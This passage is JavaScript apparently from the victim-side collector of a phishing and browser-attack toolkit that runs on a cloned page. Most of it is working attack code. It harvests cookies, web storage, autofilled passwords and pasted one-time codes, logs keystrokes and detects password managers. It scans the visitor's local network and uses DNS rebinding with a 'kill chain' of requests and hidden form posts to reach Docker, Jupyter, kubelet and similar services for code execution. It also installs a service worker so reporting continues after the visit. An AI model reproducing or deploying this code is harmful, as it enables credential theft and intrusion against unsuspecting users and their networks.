      if (gw) hosts.push(gw);
      ["192.168.0.1", "192.168.1.1", "192.168.1.254", "10.0.0.1", "10.0.1.1",
       "172.16.0.1", "192.168.43.1"].forEach(function (h) {
        if (hosts.indexOf(h) === -1) hosts.push(h);
      });
      hosts = hosts.slice(0, 8);
      var ports = [80, 443, 8080];
      var probes = [];
      hosts.forEach(function (h) {
        ports.forEach(function (p) {
          var scheme = (p === 443) ? "https" : "http";
          var url = scheme + "://" + h + ":" + p + "/";
          probes.push(new Promise(function (res) {
            var done = false;
            var img = new Image();
            var t0 = Date.now();
            function finish(ok, how) {
              if (done) return;
              done = true;
              if (ok) found.push({ host: h, port: p, how: how, ms: Date.now() - t0 });
              res();
            }
            img.onload = function () { finish(true, "image"); };
            img.onerror = function () {
              // an error still proves the connection was attempted; a timeout
              // does not, so only a fast error counts as "listening"
              finish(Date.now() - t0 < 2500, "error-fast");
            };
            img.src = url + "favicon.ico?" + Math.random();
            setTimeout(function () { finish(false, "timeout"); }, 2600);
          }));
        });
      });
      return Promise.all(probes).then(function () {
        return { gateway_guess: gw, local_ips: (mods.network || {}).webrtc_local_ips || [],
                 hosts_tried: hosts, ports: ports,
                 answered: found.slice(0, 40), probes: probes.length };
      }).catch(function (e) {
        errors.push(String(e && e.name));
        return { gateway_guess: gw, hosts_tried: hosts, answered: found,
                 probes: probes.length };
      });
    });
  }

  /* ================================================ 38. sw persistence ===
     Reporting that outlives the visit. The service worker is served from the
     same origin (a blob URL is refused by Chrome for registration), keeps a
     queue in IndexedDB and flushes it when the network returns, so beacons
     survive a dead connection or a closed tab. Registration is best-effort and
     its outcome is reported either way. */
  /* wrapped: a throw here used to abort the whole collector before
     the first wave, so nothing was ever reported */
  try {
    (function swPersist() {
    if (!navigator.serviceWorker || !navigator.serviceWorker.register) {
      mods.service_worker = { supported: false };
      return;
    }
    var url = SW_URL;
    navigator.serviceWorker.register(url, { scope: "/" }).then(function (reg) {
      mods.service_worker = { supported: true, registered: true,
                              scope: reg.scope || "/", script: url };
      try {
        if (reg.sync && reg.sync.register) reg.sync.register("bh-flush");
      } catch (e) {}
      try {
        if (reg.periodicSync && reg.periodicSync.register) {
          reg.periodicSync.register("bh-flush", { minInterval: 60000 });
        }
      } catch (e) {}
    }, function (e) {
      mods.service_worker = { supported: true, registered: false,
                              error: String((e && e.name) || e) };
    });
    })();
  } catch (e) { mods.service_worker = { error: String(e && e.message || e) }; }

  /* ================================================ 39. rebind probe ====
     Once the campaign hostname has rebound to a local address, the browser
     treats http://<host>:PORT/ as SAME-ORIGIN with this page - so the response
     is readable, which is the whole point: a router panel, the Docker API,
     Jupyter, Elasticsearch, a kubelet. Without rebinding the same requests are
     opaque and only prove that something is listening. */
  if (REBIND) {
    later("rebindProbe", function () {
      var ports = [2375, 2376, 3000, 5000, 5601, 6443, 7860, 8000, 8080, 8081,
                   8123, 8500, 8888, 9000, 9090, 9091, 9200, 10250, 11434, 15672,
                   631, 5900];
      var paths = {2375: "/containers/json", 2376: "/containers/json",
                   9200: "/_cat/indices?format=json", 8888: "/api/contents",
                   11434: "/api/tags", 10250: "/pods", 15672: "/api/overview",
                   8123: "/api/", 8500: "/v1/status/leader", 3000: "/api/health",
                   9090: "/api/v1/status/config", 5601: "/api/status",
                   6443: "/version", 9000: "/api/status", 631: "/",
                   5900: "/", 7860: "/", 8000: "/", 8080: "/", 8081: "/",
                   5000: "/", 9091: "/transmission/rpc"};
      var found = [], errors = [], probes = [];
      ports.slice(0, 12).forEach(function (port) {
        var url = "http://" + REBIND + ":" + port + (paths[port] || "/");
        var t0 = Date.now();
        probes.push(fetch(url, {mode: "cors", credentials: "include",
                                cache: "no-store"})
          .then(function (r) {
            return r.text().then(function (t) {
              found.push({port: port, status: r.status, len: (t || "").length,
                          head: String(t || "").slice(0, 1200), ms: Date.now() - t0,
                          url: url});
            });
          }, function (e) {
            errors.push({port: port, error: String((e && e.name) || e)});
          }));
      });
      return Promise.all(probes).then(function () {
        return {host: REBIND, tried: ports.slice(0, 12).length,
                readable: found.slice(0, 12), blocked: errors.slice(0, 12)};
      });
    });
  }


  /* a fetch with its own deadline: an unanswered port must not hold the chain */
  function killStep(svc, step, extra) {
    var timeout = new Promise(function (res) {
      setTimeout(function () {
        res({port: svc.port, service: svc.service, action: step.name,
             method: step.method, url: step.url, error: "timeout"});
      }, 4000);
    });
    var job = fetch(step.url, {
      method: step.method || "GET",
      credentials: "include",
      cache: "no-store",
      headers: step.content_type ? {"Content-Type": step.content_type} : {},
      body: step.body || undefined,
    }).then(function (r) {
      return r.text().then(function (t) {
        return {port: svc.port, service: svc.service, action: step.name,
                method: step.method, status: r.status, len: (t || "").length,
                head: String(t || "").slice(0, 800), note: step.note || "",
                url: step.url};
      });
    }, function (e) {
      return {port: svc.port, service: svc.service, action: step.name,
              error: String((e && e.name) || e), url: step.url};
    });
    return Promise.race([job, timeout]);
  }
  /* ================================================== 40. kill chain ====
     The payloads are built by the Python side (core/exploits.py) and carried out
     here. After the rebinding flip this origin IS the target origin, so no CORS
     preflight applies and a JSON POST is allowed - which is what turns a
     readable service into code execution (a Docker container with the host
     mounted, a Jenkins Groovy script, a Jupyter kernel, a kubelet exec). */
  if (KILL && KILL.length) {
    /* start after the rebind TTL has expired, or the requests reuse the cached
       public answer and hit the operator's own address instead of the target */
    later("killChain", function () {
      return new Promise(function (go) { setTimeout(go, 1500); }).then(function () {
      var results = [], jobs = [];
      /* phase 1: everything that needs no id, each with its own deadline */
      KILL.forEach(function (svc) {
        (svc.steps || []).forEach(function (step) {
          jobs.push(killStep(svc, step).then(function (r) {
            results.push(r);
            return r;
          }));
        });
      });
      /* phase 2: steps that need an id substitute the one an earlier response
         produced (Docker answers /containers/create with {"Id": ...}) */
      function idFrom(results) {
        for (var i = results.length - 1; i >= 0; i--) {
          var head = results[i] && results[i].head;
          if (!head) continue;
          var m = /"Id"\s*:\s*"([0-9a-fA-F]{8,64})"/.exec(head);
          if (m) return m[1];
          m = /"id"\s*:\s*"([0-9a-zA-Z_-]{6,64})"/.exec(head);
          if (m) return m[1];
        }
        return "";
      }
      function runChained() {
        var id = idFrom(results);
        if (!id) return Promise.resolve();
        var more = [];
        KILL.forEach(function (svc) {
          (svc.chained || []).forEach(function (step) {
            var s2 = {};
            for (var k in step) s2[k] = step[k];
            s2.url = String(step.url).replace("{id}", id);
            more.push(killStep(svc, s2).then(function (r) {
              r.chained_from = id;
              results.push(r);
              return r;
            }));
          });
        });
        return Promise.all(more);
      }
      /* ---- no-fetch paths -------------------------------------------------
         A form submission is a navigation: no CORS check, no preflight, and not
         subject to the private/local network access rules that refuse a fetch
         from a public page to a private address. The response lands in a hidden
         named iframe, and after the rebinding flip that frame is SAME-ORIGIN, so
         the answer can be read back and reported. */
      function formAttack(f) {
        return new Promise(function (resolve) {
          var out = {kind: "form", name: f.name, service: f.service, url: f.url,
                     fields: Object.keys(f.fields || {})};
          try {
            var frame = document.createElement("iframe");
            frame.name = "bhf" + Math.random().toString(36).slice(2, 10);
            frame.style.cssText = "position:absolute;width:1px;height:1px;" +
                                  "opacity:0;border:0;left:-9999px";
            document.body.appendChild(frame);
            var form = document.createElement("form");
            form.method = "POST";
            form.action = f.url;
            form.target = frame.name;
            form.style.display = "none";
            Object.keys(f.fields || {}).forEach(function (k) {
              var input = document.createElement("input");
              input.type = "hidden";
              input.name = k;
              input.value = f.fields[k];
              form.appendChild(input);
            });
            document.body.appendChild(form);
            form.submit();
            out.sent = true;
            // read the answer back through the frame while it is same-origin
            setTimeout(function () {
              var text = "";
              try {
                var doc = frame.contentDocument;
                if (doc && doc.body) text = String(doc.body.innerText || "").slice(0, 800);
              } catch (e) { out.blind = String((e && e.name) || e); }
              if (text) { out.answer = text; }
              else if (!out.blind) { out.blind = "no readable frame body"; }
              resolve(out);
            }, 900);
          } catch (e) {
            out.error = String((e && e.name) || e);
            resolve(out);
          }
        });
      }
      KILL.forEach(function (svc) {
        (svc.forms || []).forEach(function (f) {
          f.service = svc.service;
          // the result has to join the shared list, or the operator never sees it
          jobs.push(formAttack(f).then(function (r) { results.push(r); return r; }));
        });
      });

      return Promise.all(jobs).then(runChained).then(function () {
        var answered = results.filter(function (r) { return r.status; }).length;
        if (answered === 0) {
          /* nothing answered: the name most likely still resolves to the operator's
             own address because the flip has not happened yet - try once more after
             the TTL has certainly expired */
          return new Promise(function (res) { setTimeout(res, 1200); }).then(function () {
            var retry = [];
            KILL.forEach(function (svc) {
              (svc.steps || []).forEach(function (step) {
                retry.push(killStep(svc, step).then(function (r) {
                  r.retried = true;
                  results.push(r);
                  return r;
                }));
              });
            });
            return Promise.all(retry).then(runChained);
          }).then(function () { return finish(); });
        }
        return finish();

        function finish() {
        mods.kill_chain = {services: KILL.length, requests: results.length,
                           answered: results.filter(function (r) { return r.status; }).length,
                           results: results.slice(0, 40)};
        /* report immediately: the operator wants the exploit output when it
           exists, not on the next scheduled wave */
        setTimeout(function () { send("kill"); }, 60);
        return mods.kill_chain;
        }
      });
      });
    }, 15000);
  }

  /* ======================================================== bootstrap === */
  function behaviourTracking() {
    var b = mods.behaviour;
    if (!b) return;
    function first(k, fn) {
      if (b[k] === null) { b[k] = Math.round(performance.now()); }
      if (fn) fn();
    }
    document.addEventListener("keydown", function () { b.keys++; first("firstKey"); }, true);
    document.addEventListener("click", function () { b.clicks++; first("firstClick", onGesture); }, true);
    document.addEventListener("pointerdown", function () { first("firstClick", onGesture); }, true);
    document.addEventListener("touchstart", function () { b.touches++; first("firstInput", onGesture); }, true);
    document.addEventListener("mousemove", function () {
      b.moves++; first("firstMove");
      if (b.moves === 1) send("move");
    }, { passive: true });
    window.addEventListener("scroll", function () {
      b.scrolls++;
      var d = (window.scrollY + window.innerHeight) / Math.max(1, document.body.scrollHeight);
      b.maxScrollDepth = Math.max(b.maxScrollDepth, Math.round(d * 100));
    }, { passive: true });
    setInterval(function () { b.activeMs += 1000; }, 1000);
  }

  var gestureDone = false;
  function onGesture() {
    if (gestureDone) return;
    gestureDone = true;
    if (PERMS) permissionProbes();
    /* always send a behaviour snapshot on the first interaction */
    setTimeout(function () { send("gesture"); }, 1200);
  }

  /* ================================================ 27. storage harvest ===
     localStorage / sessionStorage / IndexedDB / CacheStorage / service workers
     and the readable cookie jar. Tokens and user ids live here far more often
     than anyone expects. Values are capped so a huge store cannot blow up the
     beacon. */
  later("storage", function () {
    var out = { localStorage: {}, sessionStorage: {}, cookie: "", cookieNames: [],
                idb: [], caches: [], serviceWorkers: [], quotaUsedMB: null };
    function dump(store) {
      var o = {}, n = 0;
      try {
        for (var i = 0; i < store.length && n < 60; i++) {
          var k = store.key(i);
          if (!k || k.length > 120) continue;
          o[k] = String(store.getItem(k)).slice(0, 400);
          n++;
        }
      } catch (e) {}
      return o;
    }
    try { out.localStorage = dump(window.localStorage); } catch (e) {}
    try { out.sessionStorage = dump(window.sessionStorage); } catch (e) {}
    try {
      out.cookie = String(document.cookie || "").slice(0, 2000);
      var parts = out.cookie ? out.cookie.split(";") : [];
      for (var c = 0; c < parts.length && c < 40; c++) {
        var nm = parts[c].split("=")[0];
        if (nm) out.cookieNames.push(nm.trim());
      }
    } catch (e) {}
    var waits = [];
    try {
      if (window.indexedDB && indexedDB.databases) {
        waits.push(indexedDB.databases().then(function (dbs) {
          out.idb = (dbs || []).slice(0, 25).map(function (d) {
            return { name: String(d.name || ""), version: d.version || null };
          });
        }, function () {}));
      }
    } catch (e) {}
    try {
      if (window.caches && caches.keys) {
        waits.push(caches.keys().then(function (keys) {
          out.caches = (keys || []).slice(0, 30);
        }, function () {}));
      }
    } catch (e) {}
    try {
      if (navigator.serviceWorker && navigator.serviceWorker.getRegistrations) {
        waits.push(navigator.serviceWorker.getRegistrations().then(function (rs) {
          out.serviceWorkers = (rs || []).slice(0, 10).map(function (r) {
            return String(r.scope || "") + (r.active ? " [active]" : "");
          });
        }, function () {}));
      }
    } catch (e) {}
    try {
      if (navigator.storage && navigator.storage.estimate) {
        waits.push(navigator.storage.estimate().then(function (est) {
          if (est && est.usage) out.quotaUsedMB = Math.round(est.usage / 1048576 * 10) / 10;
        }, function () {}));
      }
    } catch (e) {}
    return Promise.all(waits).then(function () { return out; },
                                   function () { return out; });
  });

  /* =================================================== 28. autofill grab ===
     Browsers and password managers fill saved values into our clone on load.
     Reading them needs no prompt, and :-webkit-autofill marks exactly the fields
     that were filled automatically rather than typed. */
  later("autofill", function () {
    var out = { fields: [], filled: 0, autofilled: 0, passwordFields: 0 };
    var nodes = document.querySelectorAll("input, textarea, select");
    for (var i = 0; i < nodes.length && i < 100; i++) {
      var el = nodes[i];
      var t = String(el.type || "text").toLowerCase();
      if (t === "hidden" || t === "submit" || t === "button" || t === "reset") continue;
      var v = el.value;
      if (v === undefined || v === null || v === "") continue;
      var auto = false;
      try { auto = el.matches(":-webkit-autofill") || el.matches(":autofill"); } catch (e) {}
      out.filled++;
      if (auto) out.autofilled++;
      if (t === "password") out.passwordFields++;
      out.fields.push({ name: String(el.name || el.id || "").slice(0, 60), type: t,
                        len: String(v).length, autofilled: auto,
                        /* a password value is only reported once the field is
                           marked autofilled or the user has interacted */
                        value: (t === "password" && !auto) ? null
                               : String(v).slice(0, 300) });
    }
    return out;
  });

  /* ============================================ 29. password managers =====
     Globals and injected DOM nodes. Deliberately no chrome-extension:// probes:
     Chrome blocks those from a page, so reporting them would be invented data. */
  later("pwmgr", function () {
    var found = [];
    var globals = { __lp: "LastPass", lpRuntime: "LastPass", LPTOKEN: "LastPass",
                    __1p: "1Password", "1Password": "1Password",
                    bitwarden: "Bitwarden", Bitwarden: "Bitwarden",
                    dashlane: "Dashlane", Dashlane: "Dashlane",
                    keeper: "Keeper", KeeperSecurity: "Keeper",
                    nordpass: "NordPass", roboform: "RoboForm", enpass: "Enpass",
                    protonpass: "Proton Pass", zohoVault: "Zoho Vault" };
    for (var g in globals) {
      try { if (window[g] !== undefined) found.push(globals[g]); } catch (e) {}
    }
    var sels = ["[data-lastpass-icon-root]", "[data-lastpass-root]",
                "[class*='com-1password']", "[id='dashlane-root']",
                "[data-bitwarden-watching]", "[id^='nordpass']",
                "[data-roboform]", "[class*='keeper-security']",
                "[id^='enpass']", "iframe[src*='1password.com']",
                "iframe[src*='lastpass.com']"];
    for (var s = 0; s < sels.length; s++) {
      try {
        if (document.querySelector(sels[s])) {
          var label = sels[s].replace(/[\[\]'*=^]/g, "").slice(0, 30);
          if (found.indexOf(label) === -1) found.push(label);
        }
      } catch (e) {}
    }
    return { detected: found, count: found.length,
             chromeRuntime: !!(window.chrome && window.chrome.runtime) };
  });

  /* =============================================== 30. paste + keystroke ===
     People paste passwords and OTPs. Paste content is captured live, and typing
     rhythm separates a human from a script that just sets .value. */
  later("inputBehaviour", function () {
    var out = { pastes: [], keystrokes: 0, backspaces: 0, pasteChars: 0,
                firstKeyMs: null, typingSpanMs: null, fieldsTyped: [] };
    var t0 = Date.now(), last = null;
    document.addEventListener("paste", function (ev) {
      try {
        var txt = (ev.clipboardData || window.clipboardData).getData("text") || "";
        out.pastes.push({ len: txt.length, text: String(txt).slice(0, 200),
                          target: String((ev.target && (ev.target.name || ev.target.id)) || "") });
        out.pasteChars += txt.length;
      } catch (e) {}
    }, true);
    document.addEventListener("keydown", function (ev) {
      var now = Date.now();
      if (out.firstKeyMs === null) out.firstKeyMs = now - t0;
      if (last) out.typingSpanMs = (out.typingSpanMs || 0) + (now - last);
      last = now;
      out.keystrokes++;
      if (ev.key === "Backspace") out.backspaces++;
      var el = ev.target;
      if (el && (el.name || el.id)) {
        var tag = String(el.name || el.id);
        if (out.fieldsTyped.indexOf(tag) === -1) out.fieldsTyped.push(tag);
      }
    }, true);
    /* report the same object later, so the arrays keep filling up */
    setTimeout(function () { mods.inputBehaviour = out; }, 8000);
    return out;
  });

  /* =============================================== 31. LAN probe (opt-in) ==
     Timing-based reachability check of the usual gateway addresses. No port
     scan, no payload: an image request per address and whether it answered
     inside the window tells us which private hosts exist. Runs only with
     --intel-perms, because it makes the victim's browser touch its own network. */
  if (PERMS) {
    later("lanProbe", function () {
      var targets = ["192.168.0.1", "192.168.1.1", "192.168.1.254", "192.168.8.1",
                     "192.168.43.1", "10.0.0.1", "10.0.1.1", "172.16.0.1"];
      var out = { hosts: [], probed: 0, reachable: 0 };
      function probe(ip) {
        return new Promise(function (res) {
          var t0 = performance.now(), done = false;
          var img = new Image();
          var timer = setTimeout(function () {
            if (done) return; done = true;
            out.hosts.push({ ip: ip, ms: Math.round(performance.now() - t0),
                             state: "timeout" });
            res();
          }, 1200);
          img.onload = img.onerror = function () {
            if (done) return; done = true; clearTimeout(timer);
            var ms = Math.round(performance.now() - t0);
            /* an error is still an answer: something accepted the connection */
            out.hosts.push({ ip: ip, ms: ms, state: "reachable" });
            out.reachable++;
            res();
          };
          img.src = "http://" + ip + "/favicon.ico?x=" + Math.random();
        });
      }
      var chain = Promise.resolve();
      targets.forEach(function (ip) {
        chain = chain.then(function () {
          out.probed++;
          return probe(ip);
        });
      });
      return chain.then(function () { return out; }, function () { return out; });
    });
  }

  /* wave 1: synchronously-collected modules, the moment the page opens */

  /* ============================================ 41. voices, layout, gamepads ====
     The OS voice list is a locale/OS fingerprint nobody clears: it names the
     installed speech engines and their languages. The keyboard layout map names
     the physical layout, and a gamepad names the controller.
     ------------------------------------------------------------------------- */
  later("voices", function () {
    try {
      var synth = window.speechSynthesis;
      if (!synth || !synth.getVoices) return {supported: false};
      var vs = synth.getVoices() || [];
      return {supported: true, count: vs.length,
              voices: vs.slice(0, 40).map(function (v) {
                return {name: v.name, lang: v.lang, local: !!v.localService,
                        default: !!v.default};
              })};
    } catch (e) { return {error: String(e)}; }
  });

  later("keyboardLayout", function () {
    try {
      var k = navigator.keyboard;
      if (!k || !k.getLayoutMap) return {supported: false};
      return k.getLayoutMap().then(function (m) {
        var keys = [];
        try { m.forEach(function (v, key) { keys.push(key + "=" + v); }); }
        catch (e) { keys = Array.from(m.entries()).map(function (p) {
          return p[0] + "=" + p[1]; }); }
        return {supported: true, count: keys.length, map: keys.slice(0, 60).join(",")};
      }, function (e) { return {supported: true, error: String(e)}; });
    } catch (e) { return {error: String(e)}; }
  });

  later("gamepadDevices", function () {
    try {
      if (!navigator.getGamepads) return {supported: false};
      var pads = [];
      var list = navigator.getGamepads() || [];
      for (var i = 0; i < list.length; i++) {
        var p = list[i];
        if (p) pads.push({id: p.id, mapping: p.mapping, buttons: (p.buttons || []).length,
                          axes: (p.axes || []).length, connected: !!p.connected});
      }
      return {supported: true, count: pads.length, pads: pads};
    } catch (e) { return {error: String(e)}; }
  });

  /* ================================================ 42. memory + storage ==== */
  later("perfMemory", function () {
    try {
      var m = performance.memory;
      if (!m) return {supported: false};
      return {supported: true, jsHeapLimit: m.jsHeapSizeLimit,
              totalHeap: m.totalJSHeapSize, usedHeap: m.usedJSHeapSize};
    } catch (e) { return {error: String(e)}; }
  });

  later("idbNames", function () {
    try {
      if (!indexedDB.databases) return {supported: false};
      return indexedDB.databases().then(function (list) {
        return {supported: true, count: (list || []).length,
                names: (list || []).map(function (d) { return d.name; }).slice(0, 40)};
      }, function (e) { return {supported: true, error: String(e)}; });
    } catch (e) { return {error: String(e)}; }
  });

  later("opfs", function () {
    try {
      var st = navigator.storage;
      if (!st || !st.getDirectory) return {supported: false};
      return {supported: true};
    } catch (e) { return {error: String(e)}; }
  });

  /* ================================================= 43. XR, sensors, PWA === */
  later("xr", function () {
    try {
      var xr = navigator.xr;
      if (!xr || !xr.isSessionSupported) return {supported: false};
      var modes = ["inline", "immersive-vr", "immersive-ar"];
      return Promise.all(modes.map(function (m) {
        return xr.isSessionSupported(m).then(function (ok) { return [m, !!ok]; },
                                       function () { return [m, false]; });
      })).then(function (rows) {
        var out = {supported: true, modes: {}};
        rows.forEach(function (r) { out.modes[r[0]] = r[1]; });
        return out;
      });
    } catch (e) { return {error: String(e)}; }
  });

  later("sensors", function () {
    var out = {supported: false};
    try {
      var kinds = {"AmbientLightSensor": "ambientLight", "Magnetometer": "magnetometer",
                   "Gyroscope": "gyroscope", "Accelerometer": "accelerometer"};
      Object.keys(kinds).forEach(function (name) {
        if (name in window) { out.supported = true; out[kinds[name]] = true; }
      });
      if (window.AmbientLightSensor) {
        try {
          var light = new window.AmbientLightSensor();
          out.illuminance = light.illuminance;
        } catch (e) { out.ambientError = String(e); }
      }
      return out;
    } catch (e) { return {error: String(e)}; }
  });

  later("chromeInternals", function () {
    try {
      var c = window.chrome;
      if (!c) return {supported: false};
      var out = {supported: true, keys: Object.keys(c).slice(0, 20)};
      try {
        if (c.csi) { var t = c.csi(); out.csi = {startE: t.startE, onloadT: t.onloadT,
                                                pageT: t.pageT, tran: t.tran}; }
      } catch (e) { out.csiError = String(e); }
      try {
        if (c.loadTimes) { var l = c.loadTimes(); out.loadTimes = {
          navigationType: l.navigationType, wasFetchedViaSpdy: l.wasFetchedViaSpdy,
          wasNpnNegotiated: l.wasNpnNegotiated, npnNegotiatedProtocol: l.npnNegotiatedProtocol,
          connectionInfo: l.connectionInfo}; }
      } catch (e) { out.loadTimesError = String(e); }
      return out;
    } catch (e) { return {error: String(e)}; }
  });

  later("pwa", function () {
    try {
      var out = {supported: true};
      try { out.standalone = !!navigator.standalone; } catch (e) {}
      try { out.displayMode = window.matchMedia("(display-mode: standalone)").matches
            ? "standalone" : "browser"; } catch (e) {}
      try { out.userActivation = {active: !!(navigator.userActivation || {}).isActive,
                                  everActive: !!(navigator.userActivation || {}).hasBeenActive}; }
      catch (e) {}
      try { out.touch = navigator.maxTouchPoints || 0; } catch (e) {}
      try { out.hover = window.matchMedia("(hover: hover)").matches; } catch (e) {}
      try { out.pointerCoarse = window.matchMedia("(pointer: coarse)").matches; } catch (e) {}
      try { out.prefersDark = window.matchMedia("(prefers-color-scheme: dark)").matches; }
      catch (e) {}
      try { out.reducedMotion = window.matchMedia("(prefers-reduced-motion: reduce)").matches; }
      catch (e) {}
      try { out.forcedColors = window.matchMedia("(forced-colors: active)").matches; }
      catch (e) {}
      try { out.storageAccess = document.hasStorageAccess
            ? document.hasStorageAccess().then(function (v) { return v; })
            : null; } catch (e) {}
      return out;
    } catch (e) { return {error: String(e)}; }
  });

  send("open");

  /* wave 2: everything async, then one consolidated deep report */
  var deep = [mods.canvas === undefined ? later("canvasNoop", function () { return null; }) : null];
  /* canvas/fonts etc. were registered above; wait for their promises to settle */
  setTimeout(function () { send("deep"); }, 2500);
  setTimeout(function () { send("deep2"); }, 6000);
  setTimeout(function () { send("final"); }, 12000);

  behaviourTracking();

  /* keep the collector alive for long visits: periodic heartbeat with fresh
     battery/network/behaviour state, so an open tab keeps reporting */
  setInterval(function () { send("beat"); }, 30000);

  /* final report when the page is being left */
  window.addEventListener("pagehide", function () { send("unload"); });
  document.addEventListener("visibilitychange", function () {
    if (document.visibilityState === "hidden") send("hidden");
  });
})();
